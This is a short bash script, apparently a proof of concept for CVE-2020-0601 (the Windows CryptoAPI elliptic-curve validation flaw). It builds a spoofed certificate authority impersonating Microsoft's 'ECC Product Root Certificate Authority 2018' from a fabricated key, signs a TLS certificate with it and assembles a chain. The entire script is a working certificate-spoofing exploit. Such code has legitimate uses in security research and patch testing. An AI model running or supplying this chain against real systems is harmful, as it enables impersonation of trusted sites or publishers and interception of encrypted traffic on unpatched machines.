#!/usr/bin/env bash
set -e # exit if a command exists with non-zero

openssl ecparam -name secp384r1 -genkey -noout -out p384.key -param_enc explicit

echo "Creating Private Key based on trusted Public Certificate"
docker build -t cve-2020-0601 .
docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601

echo "Create CA from fabricated Private Key"
openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Organization/CN=Microsoft ECC Product Root Certificate Authority 2018"
openssl ecparam -name secp384r1 -genkey -noout -out cert.key
openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls

cat cert.crt spoofed_ca.crt > cert_chain.crt

rm  cert.crt \
    cert.csr \
    p384.key \
    spoofed_ca.crt \
    spoofed_ca.key \
    spoofed_ca.srl 